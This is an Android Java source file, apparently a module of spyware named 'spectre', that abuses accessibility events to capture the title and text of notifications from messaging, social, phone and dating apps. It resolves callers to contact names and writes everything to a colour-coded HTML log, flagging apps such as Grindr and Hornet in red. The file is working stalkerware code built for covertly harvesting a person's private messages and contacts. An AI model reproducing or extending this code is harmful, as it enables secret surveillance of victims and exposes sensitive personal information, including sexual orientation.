package com.hygnus.spectre;

import android.app.Notification;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcelable;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.util.ArrayList;
import java.util.List;

public class NotificationDriver {

    private static final String TAG = "NotificationDriver";

    private static class NotificationBlock {
        public String text;
        public String title;
        public String packageName;
    }

    private static final NotificationBlock notificationBlock = new NotificationBlock();
    private static final List<String> notificationArrayList = new ArrayList<>();
    private static int filterTicker = 0;

    public static void captureNotification(AccessibilityEvent event) {
        Parcelable parcelableData = event.getParcelableData();
        if (parcelableData instanceof Notification) {
            try {
                Notification notification = (Notification) parcelableData;
                Bundle extras = notification.extras;

                notificationBlock.packageName = event.getPackageName() != null ? event.getPackageName().toString() : "[null]";
                notificationBlock.title = extras.getString("android.title") != null ? extras.getString("android.title") : "[null]";
                notificationBlock.text = extras.getString("android.text") != null ? extras.getString("android.text") : "[null]";

                dispatchNotification();
            } catch (Exception e) {
                Log.e(TAG, "Error capturing notification", e);
                Kernel.handleException(e);
            }
        }
    }

    private static void dispatchNotification() {
        if (!filterNotificationContent()) {
            if (!filterNotificationId()) {
                logNotification();
            }
        }
    }

    private static boolean filterNotificationContent() {
        return notificationBlock.packageName.equals("[null]") ||
                notificationBlock.title.equals("[null]") ||
                notificationBlock.text.equals("[null]");
    }

    private static boolean filterNotificationId() {
        String notificationUniqueID = notificationBlock.packageName + notificationBlock.title + notificationBlock.text;

        if (notificationArrayList.contains(notificationUniqueID)) {
            return true;
        }

        notificationArrayList.add(notificationUniqueID);
        return false;
    }

    public static void clearFilter() {
        filterTicker++;
        if (filterTicker >= 120) {
            notificationArrayList.clear();
            filterTicker = 0;
        }
    }

    private static void logNotification() {
        String style = "<span style =\"color:black\">";

        // Package-specific styling
        switch (notificationBlock.packageName) {
            case "com.whatsapp":
                style = "<span style =\"color:lightgreen\">";
                break;
            case "com.android.chrome":
                style = "<span style =\"color:mediumvioletred\">";
                break;
            case "com.facebook.katana":
                style = "<span style =\"color:steelblue\">";
                break;
            case "com.instagram.android":
                style = "<span style =\"color:gold\">";
                break;
            case "com.facebook.orca":
                style = "<span style =\"color:dodgerblue\">";
                break;
            case "br.com.uol.batepapo":
            case "com.grindrapp.android":
            case "com.hornet.android":
                style = "<span style =\"color:red\">";
                break;
            case "com.skype.raider":
                style = "<span style =\"color:blue\">";
                break;
            case "com.google.android.apps.messaging":
                style = "<span style =\"color:lightseagreen\">";
                break;
            case "com.google.android.dialer":
                style = "<span style =\"color:mediumblue\"> ☎️ ";
                notificationBlock.title = retrieveContactName(notificationBlock.title);
                break;
        }

        Storage.logMessage(Storage.notificationWriter, style + "<strong> 💬 " + notificationBlock.packageName.toUpperCase() + "</strong></span>", true);
        if (!notificationBlock.title.isEmpty()) {
            Storage.logMessage(Storage.notificationWriter, style + notificationBlock.title + "</span>", true);
        }
        if (!notificationBlock.text.isEmpty()) {
            Storage.logMessage(Storage.notificationWriter, style + notificationBlock.text + "</span>", true);
        }
    }

    public static String retrieveContactName(String phoneNumber) {
        try (Cursor cursor = Kernel.serviceContext.getContentResolver().query(
                Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber)),
                new String[]{ContactsContract.Contacts.DISPLAY_NAME},
                null, null, null)) {

            if (cursor != null && cursor.moveToFirst()) {
                return cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
            }
        } catch (Exception e) {
            Log.e(TAG, "Error retrieving contact name", e);
            Kernel.handleException(e);
        }
        return phoneNumber;
    }
}